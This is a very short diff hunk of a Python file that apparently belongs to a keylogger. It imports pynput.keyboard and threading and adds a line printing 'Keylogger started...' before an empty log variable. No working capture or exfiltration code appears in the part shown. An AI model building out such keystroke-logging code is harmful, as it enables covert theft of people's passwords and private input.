@@ -3,6 +3,8 @@
 import pynput.keyboard
 import threading
 
+print("Keylogger started...")
+
 log = ""
 
 
